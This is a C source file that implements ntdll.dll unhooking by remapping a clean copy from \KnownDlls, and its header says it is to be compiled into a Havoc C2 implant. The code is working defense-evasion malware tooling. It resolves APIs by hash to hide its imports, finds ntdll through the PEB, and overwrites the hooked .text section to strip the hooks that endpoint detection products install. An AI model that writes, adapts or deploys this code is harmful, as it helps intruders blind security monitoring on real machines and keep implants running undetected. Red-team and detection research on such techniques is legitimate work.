/*
 * Ntdll Unhooking via \KnownDlls Remapping
 *
 * EDRs place userland hooks in ntdll.dll by modifying the .text section
 * in memory. This routine remaps the clean .text from the \KnownDlls
 * object directory, restoring original syscall stubs.
 *
 * Technique: MalwareUnicorn / ReversingLabs / Windows Internals
 * Compile into Havoc Demon before main entry.
 */

#include <windows.h>
#include <winternl.h>

#ifndef NtCurrentProcess
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#endif

/* ============================================
 * Resolve function by hash (no imports)
 * ============================================ */
typedef NTSTATUS (NTAPI *pNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtFlushInstructionCache)(HANDLE, PVOID, SIZE_T);
typedef PVOID    (NTAPI *pRtlImageNtHeader)(PVOID);

#define HASH_NtOpenSection         0x6b401820
#define HASH_NtMapViewOfSection    0x6e703e8e
#define HASH_NtUnmapViewOfSection  0x7cd597c2
#define HASH_NtProtectVirtualMemory 0x50aa8e27
#define HASH_NtFlushInstructionCache 0x8cdc5d30
#define HASH_RtlImageNtHeader      0x6e8acb90

static UINT32 Fnv1aHash(const char *str)
{
    UINT32 h = 0x811c9dc5;
    while (*str) { h ^= (UCHAR)(*str++); h *= 0x01000193; }
    return h;
}

static PVOID ResolveApiByHash(HMODULE hMod, UINT32 hash)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD *names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    DWORD *funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
    WORD *ords  = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char*)((BYTE*)hMod + names[i]);
        if (Fnv1aHash(name) == hash)
            return (PVOID)((BYTE*)hMod + funcs[ords[i]]);
    }
    return NULL;
}

static HMODULE GetNtdllFromPeb(void)
{
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)ldr->InMemoryOrderModuleList.Flink;
    while (entry != (PLDR_DATA_TABLE_ENTRY)&ldr->InMemoryOrderModuleList) {
        WCHAR *name = entry->FullDllName.Buffer;
        if (name) {
            char ansi[32] = {0};
            int i = 0;
            while (name[i] && i < 31) {
                ansi[i] = (char)(name[i] >= 'A' && name[i] <= 'Z' ? name[i] + 32 : name[i]);
                i++;
            }
            if (Fnv1aHash(ansi) == Fnv1aHash("ntdll.dll"))
                return (HMODULE)entry->DllBase;
        }
        entry = (PLDR_DATA_TABLE_ENTRY)entry->InMemoryOrderLinks.Flink;
    }
    return NULL;
}

/* ============================================
 * Unhook ntdll by remapping from \KnownDlls
 * ============================================ */
VOID UnhookNtdll(void)
{
    HMODULE hNtdll = GetNtdllFromPeb();
    if (!hNtdll) return;

    pNtOpenSection         NtOpenSection         = (pNtOpenSection)ResolveApiByHash(hNtdll, HASH_NtOpenSection);
    pNtMapViewOfSection    NtMapViewOfSection    = (pNtMapViewOfSection)ResolveApiByHash(hNtdll, HASH_NtMapViewOfSection);
    pNtUnmapViewOfSection  NtUnmapViewOfSection  = (pNtUnmapViewOfSection)ResolveApiByHash(hNtdll, HASH_NtUnmapViewOfSection);
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
    pNtFlushInstructionCache NtFlushInstructionCache = (pNtFlushInstructionCache)ResolveApiByHash(hNtdll, HASH_NtFlushInstructionCache);
    pRtlImageNtHeader      RtlImageNtHeader      = (pRtlImageNtHeader)ResolveApiByHash(hNtdll, HASH_RtlImageNtHeader);

    if (!NtOpenSection || !NtMapViewOfSection || !NtUnmapViewOfSection || !NtProtectVirtualMemory)
        return;

    /* Open clean ntdll from \KnownDlls */
    UNICODE_STRING usSection = { 0 };
    WCHAR sectionName[] = L"\\KnownDlls\\ntdll.dll";
    usSection.Length = (USHORT)(wcslen(sectionName) * sizeof(WCHAR));
    usSection.MaximumLength = usSection.Length + sizeof(WCHAR);
    usSection.Buffer = sectionName;

    OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
    HANDLE hSection = NULL;
    objAttr.ObjectName = &usSection;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;

    if (!NT_SUCCESS(NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &objAttr)))
        return;

    /* Map clean ntdll into our process */
    PVOID pCleanNtdll = NULL;
    SIZE_T viewSize = 0;
    if (!NT_SUCCESS(NtMapViewOfSection(hSection, NtCurrentProcess(), &pCleanNtdll,
                                       0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY))) {
        NtClose(hSection);
        return;
    }

    /* Find .text section in both mapped copies */
    PIMAGE_NT_HEADERS ntHdrLoaded = (PIMAGE_NT_HEADERS)RtlImageNtHeader(hNtdll);
    PIMAGE_NT_HEADERS ntHdrClean  = (PIMAGE_NT_HEADERS)RtlImageNtHeader(pCleanNtdll);

    if (!ntHdrLoaded || !ntHdrClean) {
        NtUnmapViewOfSection(NtCurrentProcess(), pCleanNtdll);
        NtClose(hSection);
        return;
    }

    PIMAGE_SECTION_HEADER secLoaded = IMAGE_FIRST_SECTION(ntHdrLoaded);
    PIMAGE_SECTION_HEADER secClean  = IMAGE_FIRST_SECTION(ntHdrClean);

    for (WORD i = 0; i < ntHdrLoaded->FileHeader.NumberOfSections; i++) {
        if (secLoaded[i].Name[0] == '.' && secLoaded[i].Name[1] == 't' &&
            secLoaded[i].Name[2] == 'e' && secLoaded[i].Name[3] == 'x' &&
            secLoaded[i].Name[4] == 't') {

            PVOID pLoadedText = (PVOID)((BYTE*)hNtdll + secLoaded[i].VirtualAddress);
            PVOID pCleanText  = (PVOID)((BYTE*)pCleanNtdll + secClean[i].VirtualAddress);
            SIZE_T textSize = secLoaded[i].Misc.VirtualSize;
            ULONG oldProtect = 0;

            /* Make .text writable temporarily */
            if (NT_SUCCESS(NtProtectVirtualMemory(NtCurrentProcess(), &pLoadedText, &textSize, PAGE_EXECUTE_READWRITE, &oldProtect))) {
                /* Copy clean .text over hooked .text */
                BYTE *dst = (BYTE*)pLoadedText;
                BYTE *src = (BYTE*)pCleanText;
                for (SIZE_T j = 0; j < textSize; j++) dst[j] = src[j];

                /* Restore original protection */
                NtProtectVirtualMemory(NtCurrentProcess(), &pLoadedText, &textSize, oldProtect, &oldProtect);
                NtFlushInstructionCache(NtCurrentProcess(), pLoadedText, textSize);
            }
            break;
        }
    }

    NtUnmapViewOfSection(NtCurrentProcess(), pCleanNtdll);
    NtClose(hSection);
}
